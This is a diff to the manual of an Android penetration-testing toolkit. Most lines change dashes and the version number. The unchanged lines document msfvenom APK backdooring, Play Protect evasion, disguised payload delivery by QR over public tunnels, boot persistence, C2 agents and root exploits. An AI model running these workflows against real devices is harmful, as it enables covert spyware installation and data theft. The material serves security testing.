@@ -1,17 +1,17 @@
-# secV · android\_pentest — Complete Manual
+# secV · android\_pentest - Complete Manual
 
-**Version 2.4.2 "tauri" · Author: 0xb0rn3 | SecVulnHub**
+**Version 2.4.3 "tauri" · Author: 0xb0rn3 | SecVulnHub**
 
 > **Who this is for.** If you have never heard of ADB, Metasploit, or a reverse shell, start at
 > Chapter 1 and read forward. If you are an experienced pentester, jump to the chapter you need.
 > If you want to contribute to this module, read everything and then go to Part IV.
-> This document is the single source of truth for the module — no prior knowledge is assumed.
+> This document is the single source of truth for the module - no prior knowledge is assumed.
 
 ---
 
 ## Table of Contents
 
-### Part I — Foundations (start here if you are new)
+### Part I - Foundations (start here if you are new)
 1. [How Computers Talk to Each Other](#1-how-computers-talk-to-each-other)
 2. [What a Port Is](#2-what-a-port-is)
 3. [What a Protocol Is](#3-what-a-protocol-is)
@@ -26,14 +26,14 @@
 12. [What Frida Is](#12-what-frida-is)
 13. [What a CVE Is](#13-what-a-cve-is)
 
-### Part II — Setup and First Use
-14. [Installation — All Tiers](#14-installation--all-tiers)
+### Part II - Setup and First Use
+14. [Installation - All Tiers](#14-installation--all-tiers)
 15. [Connecting Your Device](#15-connecting-your-device)
 16. [Launching the GUI](#16-launching-the-gui)
 17. [Launching via CLI](#17-launching-via-cli)
 18. [Understanding the GUI Layout](#18-understanding-the-gui-layout)
 
-### Part III — Every Operation, Explained
+### Part III - Every Operation, Explained
 19. [Recon & Analysis Operations](#19-recon--analysis-operations)
 20. [Access & Escalation Operations](#20-access--escalation-operations)
 21. [Payload & Delivery Operations](#21-payload--delivery-operations)
@@ -44,23 +44,23 @@
 26. [Live Media Operations](#26-live-media-operations)
 27. [Automated Chain Operations](#27-automated-chain-operations)
 
-### Part IV — Deep Dives
+### Part IV - Deep Dives
 28. [The APK Build Pipeline](#28-the-apk-build-pipeline)
 29. [BootBuddy and Boot Persistence](#29-bootbuddy-and-boot-persistence)
-30. [WAN C2 — Working Without Port Forwarding](#30-wan-c2--working-without-port-forwarding)
+30. [WAN C2 - Working Without Port Forwarding](#30-wan-c2--working-without-port-forwarding)
 31. [The Screen Mirror and Live Media System](#31-the-screen-mirror-and-live-media-system)
 32. [The Embedded PTY Shell](#32-the-embedded-pty-shell)
 33. [Dependency System and Package Managers](#33-dependency-system-and-package-managers)
 
-### Part V — Reference
+### Part V - Reference
 34. [Global Parameter Reference](#34-global-parameter-reference)
 35. [Vulnerability Database](#35-vulnerability-database)
 36. [Artifact Locations](#36-artifact-locations)
 37. [Troubleshooting](#37-troubleshooting)
 
-### Part VI — Contributing and Module Development
+### Part VI - Contributing and Module Development
 38. [How the Module Talks to secV](#38-how-the-module-talks-to-secv)
-39. [Module Architecture — Where Everything Lives](#39-module-architecture--where-everything-lives)
+39. [Module Architecture - Where Everything Lives](#39-module-architecture--where-everything-lives)
 40. [Adding a New Operation](#40-adding-a-new-operation)
 41. [Adding a New GUI Panel](#41-adding-a-new-gui-panel)
 42. [Adding a New API Endpoint](#42-adding-a-new-api-endpoint)
@@ -68,15 +68,15 @@
 
 ---
 
-# Part I — Foundations
+# Part I - Foundations
 
 ## 1. How Computers Talk to Each Other
 
-Every device on a network has an **IP address** — a number that works like a postal address.
+Every device on a network has an **IP address** - a number that works like a postal address.
 When your laptop is on WiFi it might have an address like `192.168.1.42`. When an Android
 phone joins the same WiFi it might be `192.168.1.105`.
 
-Data travels between devices in packets — small chunks of bytes. Each packet says where it
+Data travels between devices in packets - small chunks of bytes. Each packet says where it
 came from (source IP) and where it is going (destination IP).
 
 The internet is made of millions of networks. To reach a device that is not on your local
@@ -115,12 +115,12 @@ Ports are numbers from 0 to 65535.
 | 8897 | secV Android GUI |
 
 When a Meterpreter payload calls back to you, it opens a connection from the phone to your
-IP address on a specific port — usually 4444. Your listener (Metasploit's multi/handler) has
+IP address on a specific port - usually 4444. Your listener (Metasploit's multi/handler) has
 to be waiting on that port before the connection arrives, otherwise the payload has nowhere
 to connect and dies.
 
-**LHOST** means "listening host" — your IP address.
-**LPORT** means "listening port" — the port your handler is waiting on.
+**LHOST** means "listening host" - your IP address.
+**LPORT** means "listening port" - the port your handler is waiting on.
 
 ---
 
@@ -130,16 +130,16 @@ A **protocol** is a set of rules that both sides of a connection agree to follow
 understand each other. If ports are doors, protocols are the languages spoken through them.
 
 **TCP** (Transmission Control Protocol): Reliable. Guarantees every packet arrives in order.
-Used for most things — web, SSH, Meterpreter reverse_tcp.
+Used for most things - web, SSH, Meterpreter reverse_tcp.
 
 **UDP** (User Datagram Protocol): Fast but unreliable. No guarantees. Used for video, DNS,
 gaming.
 
 **HTTP vs. HTTPS**: HTTP is plain text. Anyone watching the network can read it. HTTPS wraps
-HTTP in TLS encryption — the content is unreadable to an eavesdropper.
+HTTP in TLS encryption - the content is unreadable to an eavesdropper.
 
 For Meterpreter, `reverse_tcp` uses raw TCP and is the most reliable option on a local
-network. `reverse_http` and `reverse_https` disguise the traffic as web browsing — useful
+network. `reverse_http` and `reverse_https` disguise the traffic as web browsing - useful
 when a firewall blocks random ports but allows HTTP/HTTPS.
 
 ---
@@ -180,7 +180,7 @@ The `wan_expose` operation tries cloudflared first, then falls back to bore if c
 is not installed.
 
 This is why `LHOST` can be set to `bore.pub` (or auto-detected) and `LPORT` set to the
-bore-assigned port — the payload on the phone calls back to bore, bore forwards to you.
+bore-assigned port - the payload on the phone calls back to bore, bore forwards to you.
 
 ---
 
@@ -221,34 +221,34 @@ work, and prints results as JSON on stdout. secV reads that and displays it.
 A **payload** is code that runs on the target to give the attacker some capability. In the
 context of Android pentesting, payloads are usually:
 
-**1. APK payloads** — An Android app (`.apk` file) that looks normal but secretly opens a
+**1. APK payloads** - An Android app (`.apk` file) that looks normal but secretly opens a
 connection back to the attacker when installed and run. Metasploit can generate these with
 `msfvenom`. The user is socially engineered into installing it.
 
-**2. Shellcode payloads** — Raw machine code injected into a running process. Used in
+**2. Shellcode payloads** - Raw machine code injected into a running process. Used in
 exploit development. Less common for Android without root.
 
-**3. Script payloads** — Shell scripts pushed via ADB that run on the device. Used when
+**3. Script payloads** - Shell scripts pushed via ADB that run on the device. Used when
 you already have ADB access.
 
 **Staged vs. stageless payloads**
 
-A **staged** payload is small — it just opens a connection and downloads the real payload
+A **staged** payload is small - it just opens a connection and downloads the real payload
 (the "stage") from the attacker. This keeps the APK smaller and lets you swap the stage.
 `android/meterpreter/reverse_tcp` is staged.
 
-A **stageless** payload has everything built in — larger file but works even if the network
+A **stageless** payload has everything built in - larger file but works even if the network
 is restricted after initial connection. `android/meterpreter_reverse_tcp` is stageless.
 
 **How payload detection works**
 
-Antivirus (AV) and Google Play Protect scan APKs for known signatures — patterns of bytes
+Antivirus (AV) and Google Play Protect scan APKs for known signatures - patterns of bytes
 that appear in known malicious code. Metasploit payloads have well-known signatures. That
-is why raw `deploy_shell` APKs are detected immediately — Play Protect recognizes the
+is why raw `deploy_shell` APKs are detected immediately - Play Protect recognizes the
 `com.metasploit.stage` package and the Payload.smali bytecode pattern.
 
 The `bypass_play_protect` operation changes the package name, removes suspicious patterns,
-and adds noise classes. The `rebuild` operation goes further — the APK contains no Meterpreter
+and adds noise classes. The `rebuild` operation goes further - the APK contains no Meterpreter
 bytecode at all, only a loader that fetches the payload from a tunnel at runtime.
 
 ---
@@ -256,7 +256,7 @@ bytecode at all, only a loader that fetches the payload from a tunnel at runtime
 ## 7. What a Reverse Shell Is
 
 A **shell** is a command-line interface where you type commands and get output. On Android
-it looks like the Unix shell — `ls`, `cat`, `id`, `whoami`.
+it looks like the Unix shell - `ls`, `cat`, `id`, `whoami`.
 
 In a normal connection, you (the client) connect to the server. In a **reverse shell**, the
 target connects to you. This works around firewalls: the target is allowed to make outbound
@@ -279,12 +279,12 @@ the protocol of the specific payload (Meterpreter) and gives you an interactive 
 
 **Metasploit Framework** is an open-source penetration testing platform. It provides:
 
-- **msfvenom** — a payload generator. Takes a payload type, LHOST, LPORT, and output format,
+- **msfvenom** - a payload generator. Takes a payload type, LHOST, LPORT, and output format,
   produces the file (APK, ELF, EXE, raw shellcode, etc.)
-- **msfconsole** — the interactive shell where you load modules, set options, and run exploits
-- **Exploit modules** — code for specific vulnerabilities
-- **multi/handler** — a generic listener that catches reverse shells from msfvenom payloads
-- **Meterpreter** — an advanced post-exploitation agent (see next chapter)
+- **msfconsole** - the interactive shell where you load modules, set options, and run exploits
+- **Exploit modules** - code for specific vulnerabilities
+- **multi/handler** - a generic listener that catches reverse shells from msfvenom payloads
+- **Meterpreter** - an advanced post-exploitation agent (see next chapter)
 
 **Basic Metasploit workflow for Android:**
 
@@ -325,14 +325,14 @@ upload /file /sdcard/  → push a file to device
 download /sdcard/x /tmp/  → pull a file from device
 ```
 
-The Live Media panel in the secV GUI wraps these commands — you click "▶ MSF" and it runs
+The Live Media panel in the secV GUI wraps these commands - you click "▶ MSF" and it runs
 the right Meterpreter command and displays the result.
 
 ---
 
 ## 10. What an APK Is
 
-An **APK** (Android Package) is the file format for Android apps — like a `.exe` on Windows
+An **APK** (Android Package) is the file format for Android apps - like a `.exe` on Windows
 or a `.dmg` on Mac.
 
 Internally, an APK is a ZIP archive containing:
@@ -381,10 +381,10 @@ ADB lets you:
 **Enabling ADB on your device:**
 
 1. Go to **Settings → About Phone**
-2. Tap **Build Number** seven times — "Developer options" unlocks
+2. Tap **Build Number** seven times - "Developer options" unlocks
 3. Go to **Settings → Developer Options**
 4. Enable **USB Debugging**
-5. Connect via USB — accept the "Allow USB Debugging?" dialog on the phone
+5. Connect via USB - accept the "Allow USB Debugging?" dialog on the phone
 
 **ADB commands used by this module:**
 
@@ -407,7 +407,7 @@ the network). The `device_monitor.sh` script watches for devices and auto-connec
 ## 12. What Frida Is
 
 **Frida** is a dynamic instrumentation toolkit. It lets you inject JavaScript code into a
-running process and intercept, modify, or observe its behaviour in real time — without
+running process and intercept, modify, or observe its behaviour in real time - without
 recompiling the app.
 
 Why this matters:
@@ -427,11 +427,11 @@ Why this matters:
 2. On your machine, `frida-tools` connects to it and injects your JavaScript
 3. The script runs inside the app's process
 
-The `frida_hook` operation handles all of this — it pushes frida-server, connects, and runs
+The `frida_hook` operation handles all of this - it pushes frida-server, connects, and runs
 the appropriate script for the chosen `hook_mode`.
 
 **Objection** builds on Frida to automate common tasks. The `objection_patch` operation
-injects the Frida gadget into the APK at build time — so frida-server is not needed at
+injects the Frida gadget into the APK at build time - so frida-server is not needed at
 runtime. The gadget loads when the app starts.
 
 ---
@@ -458,13 +458,13 @@ real-time CVE data for the detected Android version.
 
 ---
 
-# Part II — Setup and First Use
+# Part II - Setup and First Use
 
-## 14. Installation — All Tiers
+## 14. Installation - All Tiers
 
 The module works at four tiers. Each tier unlocks more operations.
 
-### Tier 1 — Minimal (device recon only)
+### Tier 1 - Minimal (device recon only)
 
 Requires only ADB. No APK tools, no Python extras.
 
@@ -481,7 +481,7 @@ adb version
 
 Available: `recon`, `adb_wifi`, `device_net_scan`, basic `inject_agent`
 
-### Tier 2 — Standard (APK analysis)
+### Tier 2 - Standard (APK analysis)
 
 ```bash
 # Arch
@@ -493,7 +493,7 @@ sudo apt install apktool aapt default-jdk
 
 Available: all Tier 1, plus `app_scan`, `vuln_scan`, `exploit`
 
-### Tier 3 — Full (code decompilation + payload generation)
+### Tier 3 - Full (code decompilation + payload generation)
 
 ```bash
 # Arch (with AUR helper)
@@ -509,7 +509,7 @@ sudo apt install android-tools-adb apktool aapt default-jdk jadx
 
 Available: all Tier 2, plus `backdoor_apk`, `deploy_shell`, `rebuild`, `msf_handler`
 
-### Tier 4 — Runtime instrumentation
+### Tier 4 - Runtime instrumentation
 
 ```bash
 pip3 install frida-tools objection requests cryptography pillow qrcode
@@ -552,7 +552,7 @@ secv android --operation deps
 2. Settings → Developer Options → enable **USB Debugging**
 3. Connect USB cable
 4. On the phone: tap **Allow** on the "Allow USB Debugging?" prompt
-5. Verify: `adb devices` — the device should show with status `device` (not `unauthorized`)
+5. Verify: `adb devices` - the device should show with status `device` (not `unauthorized`)
 
 **If it shows `unauthorized`:** The trust dialog was not accepted. Revoke all ADB
 authorizations in Developer Options, disconnect, reconnect, and accept the dialog again.
@@ -598,7 +598,7 @@ Open `http://127.0.0.1:8897` in your browser. You should see the secV Android GU
 
 The GUI is a single-page web application served by a Python HTTP server. The browser and
 server communicate via REST API calls (`/api/*`) and Server-Sent Events (SSE) for real-time
-streaming output. You do not need an internet connection — everything runs locally.
+streaming output. You do not need an internet connection - everything runs locally.
 
 ---
 
@@ -645,10 +645,10 @@ secv android --operation recon --serve false | jq .device
 ```
 
 **Topbar:**
-- Device badge — shows connected device name and Android version
-- LHOST indicator — shows current attacker IP
-- **⊟ ops** button — toggles the operations sidebar
-- Tab buttons — switch between Ops/P&D/Live/Shell/Files/C2
+- Device badge - shows connected device name and Android version
+- LHOST indicator - shows current attacker IP
+- **⊟ ops** button - toggles the operations sidebar
+- Tab buttons - switch between Ops/P&D/Live/Shell/Files/C2
 
 **Sidebar:** Click any operation to load its configuration form in the center.
 Each operation shows a description, its parameters, and an equivalent CLI command at the bottom.
@@ -665,11 +665,11 @@ Each operation shows a description, its parameters, and an equivalent CLI comman
 
 ---
 
-# Part III — Every Operation, Explained
+# Part III - Every Operation, Explained
 
 ## 19. Recon & Analysis Operations
 
-### `recon` — Device Fingerprinting
+### `recon` - Device Fingerprinting
 
 **What it does:** Connects to the device over ADB and reads every piece of security-relevant
 information it can without modifying anything on the device. Think of it as taking inventory.
@@ -677,14 +677,14 @@ information it can without modifying anything on the device. Think of it as taki
 **What it checks:**
 - Device model, manufacturer, Android version, SDK API level
 - CPU architecture (arm64-v8a, armeabi-v7a, x86_64)
-- Whether the device is **rooted** — checked by looking for `su` binary, Magisk, KernelSU,
+- Whether the device is **rooted** - checked by looking for `su` binary, Magisk, KernelSU,
   SuperSU, Zygisk, `/system/xbin/su`, `/data/local/tmp/su`
 - Bootloader lock status
 - SELinux mode (enforcing = some exploits blocked, permissive = easier)
 - Full-disk or file-based encryption status
 - Screen lock type (PIN, password, pattern, none)
 - Developer mode / USB debugging on or off
-- ADB network access (if port 5555 is listening — critical vulnerability)
+- ADB network access (if port 5555 is listening - critical vulnerability)
 - Security patch level (month/year when last updated)
 - Kernel version
 - Battery level and device uptime
@@ -700,22 +700,22 @@ secv android --operation recon --device 192.168.1.105:5555
 
 ---
 
-### `app_scan` — Static APK Analysis
+### `app_scan` - Static APK Analysis
 
 **What it does:** Pulls the APK for the target package from the device (using `adb pull`),
-decompiles it with `apktool`, and performs static analysis — reading the code without running
+decompiles it with `apktool`, and performs static analysis - reading the code without running
 it. Like reading a book vs. actually going to the places it describes.
 
 **Analysis stages:**
 
-1. **Manifest audit** — reads `AndroidManifest.xml`. Checks:
-   - `android:debuggable="true"` — the app can be debugged in production (HIGH risk)
-   - `android:allowBackup="true"` — anyone with ADB can pull all the app's data
-   - `android:usesCleartextTraffic="true"` — the app sends unencrypted HTTP
+1. **Manifest audit** - reads `AndroidManifest.xml`. Checks:
+   - `android:debuggable="true"` - the app can be debugged in production (HIGH risk)
+   - `android:allowBackup="true"` - anyone with ADB can pull all the app's data
+   - `android:usesCleartextTraffic="true"` - the app sends unencrypted HTTP
    - Exported Activities/Services/Receivers/Providers without permission guards
    - Dangerous permissions (`READ_CONTACTS`, `CAMERA`, `RECORD_AUDIO`, etc.)
 
-2. **Secret scanning** — searches decompiled smali and assets for patterns like:
+2. **Secret scanning** - searches decompiled smali and assets for patterns like:
    - AWS access keys (`AKIA...`)
    - API keys, tokens, private keys
    - Hardcoded passwords
@@ -723,14 +723,14 @@ it. Like reading a book vs. actually going to the places it describes.
    - Credit card patterns
    - Private IP addresses
 
-3. **Code vulnerability scan** — looks for dangerous patterns:
+3. **Code vulnerability scan** - looks for dangerous patterns:
    - `WebView.addJavascriptInterface()` without proper `@JavascriptInterface` annotation
    - SQL query string concatenation (potential injection)
    - `MD5`/`SHA1`/`DES`/`ECB` usage (weak crypto)
    - `StrictMode` disabled (common in production by mistake)
    - `setJavaScriptEnabled(true)` in WebViews
 
-4. **Deep analysis** (`--deep-analysis true`) — runs `jadx` to decompile DEX to Java.
+4. **Deep analysis** (`--deep-analysis true`) - runs `jadx` to decompile DEX to Java.
    More readable than smali and catches more patterns, but 5–10x slower.
 
 **CLI:**
@@ -744,7 +744,7 @@ secv android --operation app_scan --scan-limit 10   # scan top 10 installed apps
 
 ---
 
-### `vuln_scan` — Vulnerability Assessment
+### `vuln_scan` - Vulnerability Assessment
 
 **What it does:** Combines device-level checks with app analysis to produce a CVSS-weighted
 vulnerability report. When an NVD API key is provided, it queries the National Vulnerability
@@ -760,10 +760,10 @@ each with: description, affected component, CVSS score if available, and remedia
 
 ---
 
-### `exploit` — Component Exploitation Testing
+### `exploit` - Component Exploitation Testing
 
 **What it does:** Tests whether discovered vulnerabilities are actually exploitable. All tests
-are **non-destructive** — they probe but do not modify or damage data.
+are **non-destructive** - they probe but do not modify or damage data.
 
 **Tests performed:**
 
@@ -780,7 +780,7 @@ secv android --operation exploit --package com.target.app
 
 ---
 
-### `network` — Traffic Capture & Analysis
+### `network` - Traffic Capture & Analysis
 
 **What it does:** Captures network traffic from the device. Needs root for full packet
 capture. Without root, reads logcat for credential leakage.
@@ -798,7 +798,7 @@ Combined with `--bypass-ssl true` (uses Frida to defeat pinning), you can read a
 
 ---
 
-### `forensics` — Data Extraction
+### `forensics` - Data Extraction
 
 **What it does:** Pulls as much data from the device as possible. Some paths require root.
 
@@ -825,10 +825,10 @@ of all app data for apps that have `allowBackup="true"`.
 
 ---
 
-### `device_net_scan` — Device Network Scan
+### `device_net_scan` - Device Network Scan
 
 **What it does:** Gets the device's WiFi IP address, then runs a network scan of the local
-subnet. Useful for pivoting — once you have access to the device, you can use it to discover
+subnet. Useful for pivoting - once you have access to the device, you can use it to discover
 other hosts on its network.
 
 ```bash
@@ -837,7 +837,7 @@ secv android --operation device_net_scan
 
 ---
 
-### `full` — Complete Assessment
+### `full` - Complete Assessment
 
 Chains recon → app_scan → vuln_scan → exploit → network → forensics in sequence.
 
@@ -849,7 +849,7 @@ secv android --operation full --package com.target.app --deep-analysis true
 
 ## 20. Access & Escalation Operations
 
-### `adb_wifi` — Enable ADB over WiFi
+### `adb_wifi` - Enable ADB over WiFi
 
 Sends `adb tcpip 5555` to the device. After this, you can unplug USB and connect wirelessly
 with `adb connect <device-ip>:5555`.
@@ -861,19 +861,19 @@ secv android --operation adb_wifi --adb-port 6000   # custom port
 
 ---
 
-### `get_root` — Multi-Vector Root Acquisition
+### `get_root` - Multi-Vector Root Acquisition
 
 **What it does:** Tries multiple root acquisition methods in order, stopping at first success.
 
 **Methods tried, in order:**
 
-1. **Magisk/su detection** — checks if `su` binary already exists. If yes, confirms root access.
-2. **`adb root`** — works on userdebug and eng builds (development devices, emulators).
-3. **CVE-2024-0044** — a privilege escalation in Android's `run-as` command affecting
+1. **Magisk/su detection** - checks if `su` binary already exists. If yes, confirms root access.
+2. **`adb root`** - works on userdebug and eng builds (development devices, emulators).
+3. **CVE-2024-0044** - a privilege escalation in Android's `run-as` command affecting
    Android 12–14 before the 2024 QPR2 patch. Exploits a TOCTOU race in the UID check to
    read any app's data directory without root.
-4. **mtk-su** — MediaTek-specific root exploit for older MT6xxx devices.
-5. **KernelSU/APatch detection** — checks if these alternative root methods are active.
+4. **mtk-su** - MediaTek-specific root exploit for older MT6xxx devices.
+5. **KernelSU/APatch detection** - checks if these alternative root methods are active.
 
 ```bash
 secv android --operation get_root
@@ -881,7 +881,7 @@ secv android --operation get_root
 
 ---
 
-### `exploit_cve` — Targeted CVE Exploit
+### `exploit_cve` - Targeted CVE Exploit
 
 ```bash
 secv android --operation exploit_cve --cve CVE-2024-0044
@@ -892,7 +892,7 @@ See Chapter 13 for CVE descriptions.
 
 ---
 
-### `cve_chain` — Chained CVE Escalation
+### `cve_chain` - Chained CVE Escalation
 
 Attempts a predefined chain of CVEs to escalate privileges step by step.
 
@@ -902,14 +902,14 @@ secv android --operation cve_chain
 
 ---
 
-### `zero_click` — Zero-Interaction Attack Surfaces
+### `zero_click` - Zero-Interaction Attack Surfaces
 
-**What it does:** Tests attack surfaces that don't require the user to click anything —
+**What it does:** Tests attack surfaces that don't require the user to click anything -
 the target just has to have a certain feature enabled.
 
 - **NFC:** Crafts NFC NDEF records that trigger Android Beam / NFC tag dispatch to launch
   activities or open URLs.
-- **Bluetooth HID:** Tests CVE-2023-45866 — sending HID keyboard injection packets over
+- **Bluetooth HID:** Tests CVE-2023-45866 - sending HID keyboard injection packets over
   Bluetooth without pairing.
 - **WiFi:** Tests for deauth vulnerability, probe response manipulation.
 
@@ -921,14 +921,14 @@ secv android --operation zero_click
 
 ## 21. Payload & Delivery Operations
 
-### `backdoor_apk` — APK Injection
+### `backdoor_apk` - APK Injection
 
 **What it does:** Takes a legitimate installed app, injects Meterpreter, re-signs it.
 
 **The process:**
 1. Pull the original APK from the device: `adb shell pm path com.target.app` → `adb pull`
 2. Run `msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -x original.apk -o backdoored.apk`
-   (the `-x` flag uses the original APK as a template — Meterpreter is injected into it)
+   (the `-x` flag uses the original APK as a template - Meterpreter is injected into it)
 3. Re-sign with `secv.keystore`
 4. Optionally: uninstall original + install backdoored version
 
@@ -952,9 +952,9 @@ flag it unless combined with `bypass_play_protect`.
 
 ---
 
-### `deploy_shell` — Generate Fresh Payload APK
+### `deploy_shell` - Generate Fresh Payload APK
 
-Generates a new msfvenom APK (not injected into anything — it is a standalone payload app),
+Generates a new msfvenom APK (not injected into anything - it is a standalone payload app),
 signs it, serves it via HTTP on `serve_port`, and installs it via ADB if a device is connected.
 
 ```bash
@@ -972,7 +972,7 @@ Play Protect will flag it unless `bypass_play_protect` is run on the output.
 
 ---
 
-### `bypass_play_protect` — Evasion Repackaging
+### `bypass_play_protect` - Evasion Repackaging
 
 **What it does:** Transforms a Metasploit APK so it bypasses Play Protect static scanning.
 
@@ -999,9 +999,9 @@ secv android --operation bypass_play_protect \
 
 ---
 
-### `customize_apk` — Cosmetic APK Patching
+### `customize_apk` - Cosmetic APK Patching
 
-Changes the visible appearance of an APK — icon, name, package ID — without touching the
+Changes the visible appearance of an APK - icon, name, package ID - without touching the
 payload functionality. Used after `bypass_play_protect` to make the app look convincing.
 
 **What it patches:**
@@ -1028,7 +1028,7 @@ secv android --operation customize_apk \
 
 ---
 
-### `wan_expose` — Public WAN Exposure
+### `wan_expose` - Public WAN Exposure
 
 Makes your Metasploit listener and APK HTTP server reachable from anywhere on the internet.
 
@@ -1052,7 +1052,7 @@ A QR code is generated encoding the public APK download URL.
 
 ---
 
-### `qr_exploit` — QR Code Payload Delivery
+### `qr_exploit` - QR Code Payload Delivery
 
 Generates a QR code for various delivery scenarios.
 
@@ -1072,7 +1072,7 @@ secv android --operation qr_exploit --qr-mode adb_pair \
 secv android --operation qr_exploit --qr-mode deeplink
 ```
 
-**WAN mode** — bore tunnel + detached HTTP server + QR encodes the bore public URL:
+**WAN mode** - bore tunnel + detached HTTP server + QR encodes the bore public URL:
 ```bash
 secv android --operation qr_exploit --qr-mode apk --mode wan
 # The victim scans the QR, downloads the APK from bore.pub:<port>/payload.apk
@@ -1081,7 +1081,7 @@ secv android --operation qr_exploit --qr-mode apk --mode wan
 
 ---
 
-### `msf_handler` — Start Metasploit Listener
+### `msf_handler` - Start Metasploit Listener
 
 Generates a handler.rc file and starts `msfconsole` with it. The handler waits for the
 payload to call back.
@@ -1094,14 +1094,14 @@ secv android --operation msf_handler --payload android/meterpreter/reverse_https
 The RC file is saved to `~/.secv/android/auto/<timestamp>/handler.rc`. You can re-run it
 manually later: `msfconsole -q -r ~/.secv/android/auto/<timestamp>/handler.rc`
 
-**`ExitOnSession false`** is always set — the handler stays up after the first session, ready
+**`ExitOnSession false`** is always set - the handler stays up after the first session, ready
 to catch more.
 
 ---
 
 ## 22. Instrumentation Operations
 
-### `frida_hook` — Runtime Instrumentation
+### `frida_hook` - Runtime Instrumentation
 
 ```bash
 # SSL pinning bypass (intercept HTTPS with Burp)
@@ -1142,23 +1142,23 @@ secv android --operation frida_hook \
 
 ---
 
-### `objection_patch` — Gadget Injection
+### `objection_patch` - Gadget Injection
 
 **When to use this instead of `frida_hook`:** When the device is not rooted and you cannot
 run frida-server. Objection patches the APK to include the Frida gadget as a native library
-that loads when the app starts — no frida-server needed.
+that loads when the app starts - no frida-server needed.
 
 ```bash
 secv android --operation objection_patch --package com.target.app
 ```
 
 **Trade-off:** The APK must be reinstalled. The original app must be uninstalled first (or
-the patched APK installed over it if signatures match — they won't unless you control the
+the patched APK installed over it if signatures match - they won't unless you control the
 keystore). Some apps detect tampered signatures.
 
 ---
 
-### `process_inject` — Process Injection
+### `process_inject` - Process Injection
 
 Injects a payload into a running process on a rooted device using `/proc/pid/mem` writes
 or ptrace-based injection.
@@ -1169,9 +1169,9 @@ secv android --operation process_inject --package com.target.app
 
 ---
 
-### `lsposed_hook` — LSPosed Framework Hook
+### `lsposed_hook` - LSPosed Framework Hook
 
-Generates an LSPosed module that hooks the target app at the Zygote/framework level — before
+Generates an LSPosed module that hooks the target app at the Zygote/framework level - before
 the app even starts. More powerful than Frida for persistent hooks.
 
 ```bash
@@ -1182,7 +1182,7 @@ secv android --operation lsposed_hook --package com.target.app
 
 ---
 
-### `unhook` — Remove Hooks
+### `unhook` - Remove Hooks
 
 Detaches Frida, removes the gadget from patched APKs, restores originals from backup.
 
@@ -1194,7 +1194,7 @@ secv android --operation unhook --package com.target.app
 
 ## 23. Persistence Operations
 
-### `persist` — Boot Receiver Persistence
+### `persist` - Boot Receiver Persistence
 
 **The goal:** Make your payload survive device reboots without root.
 
@@ -1203,7 +1203,7 @@ secv android --operation unhook --package com.target.app
 registered receivers. Your receiver starts a Service that opens a reverse shell back to you.
 
 This requires the user to have installed the payload app. No root needed. The `allowBackup`
-flag does not matter — the receiver is in the manifest.
+flag does not matter - the receiver is in the manifest.
 
 ```bash
 secv android --operation persist --lhost 192.168.1.42 --lport 4444
@@ -1218,33 +1218,33 @@ earlier startup execution, before the Android framework is fully up.
 
 ## 24. C2 & Agent Operations
 
-### `inject_agent` — Native Agent Deployment
+### `inject_agent` - Native Agent Deployment
 
 **What it does:** Pushes a compiled agent binary to the device, executes it, and receives
 its callback.
 
 **Agent types:**
-- `secv_agent.sh` — Shell script. Works on any Android, no compilation. Sends JSON recon data.
-- `secv_agent` (compiled C binary) — Built with Android NDK for ARM64. Faster, smaller,
+- `secv_agent.sh` - Shell script. Works on any Android, no compilation. Sends JSON recon data.
+- `secv_agent` (compiled C binary) - Built with Android NDK for ARM64. Faster, smaller,
   less visible in `ps` output.
 
 **Agent modes:**
 
 ```bash
-# Recon mode — receive JSON device profile
+# Recon mode - receive JSON device profile
 secv android --operation inject_agent \
   --agent-mode recon \
   --c2-host 192.168.1.42 \
   --c2-port 8889
 
-# Exploit mode — agent tries to escalate, then callback
+# Exploit mode - agent tries to escalate, then callback
 secv android --operation inject_agent \
   --agent-mode exploit \
   --escalate true \
   --c2-host 192.168.1.42 \
   --c2-port 8889
 
-# Full C2 mode — persistent agent, receives commands in a loop
+# Full C2 mode - persistent agent, receives commands in a loop
 secv android --operation inject_agent \
   --agent-mode c2 \
   --c2-host 192.168.1.42 \
@@ -1259,7 +1259,7 @@ python3 tools/mobile/android/agent/c2_server.py --auto-exploit --lhost 192.168.1
 
 ---
 
-### `c2_gui` — C2 Web Dashboard
+### `c2_gui` - C2 Web Dashboard
 
 Starts the standalone C2 dashboard (`c2_gui.py`). Also accessible as the C2 tab inside
 the main GUI.
@@ -1275,11 +1275,11 @@ secv android --operation c2_gui --c2-port 8889
 - MSF session log (streamed from msfconsole)
 - QR code generator for APK delivery
 - Operations launcher (run any operation from the dashboard)
-- Encrypted session logs — .scv files with 5-layer encryption (PBKDF2 + SHA3 + Scrypt + AES-GCM + ChaCha20)
+- Encrypted session logs - .scv files with 5-layer encryption (PBKDF2 + SHA3 + Scrypt + AES-GCM + ChaCha20)
 
 ---
 
-### `c2_cli` — Headless C2 Server
+### `c2_cli` - Headless C2 Server
 
 C2 without the browser UI.
 
@@ -1291,7 +1291,7 @@ secv android --operation c2_cli --c2-port 8889
 
 ## 25. Evasion & Customization Operations
 
-See Chapter 21 (`bypass_play_protect`, `customize_apk`) — they are listed there because
+See Chapter 21 (`bypass_play_protect`, `customize_apk`) - they are listed there because
 they are typically part of the payload delivery pipeline.
 
 The **Evasion & Customization** sidebar group is where these appear in the GUI. They are
@@ -1383,7 +1383,7 @@ play it. Stop: sends `KEYCODE_MEDIA_STOP` and force-stops known player packages.
 
 ## 27. Automated Chain Operations
 
-### `full_pwn` — Complete Automated Compromise
+### `full_pwn` - Complete Automated Compromise
 
 Chains seven operations sequentially, each feeding its results into the next:
 
@@ -1400,7 +1400,7 @@ the remaining steps. The results of each step are in the final JSON output.
 
 ---
 
-### `multi_device` — Parallel Operations
+### `multi_device` - Parallel Operations
 
 Runs any operation on ALL connected devices simultaneously using threading.
 
@@ -1416,7 +1416,7 @@ Each device gets its own session. Results are tagged with device serial numbers.
 
 ---
 
-# Part IV — Deep Dives
+# Part IV - Deep Dives
 
 ## 28. The APK Build Pipeline
 
@@ -1461,7 +1461,7 @@ Every operation that produces or modifies an APK goes through this pipeline:
 efficient memory-mapped access. An unaligned APK will fail to install on modern Android.
 
 **The secv.keystore:** A pre-generated keystore stored in `apk_backdoor/secv.keystore`.
-It is consistent — all APKs built by this module are signed with the same certificate.
+It is consistent - all APKs built by this module are signed with the same certificate.
 This matters because Android will not let you update an app if the new APK is signed with a
 different certificate than the installed one.
 
@@ -1477,11 +1477,11 @@ If you are on mobile data, neither can the phone.
 
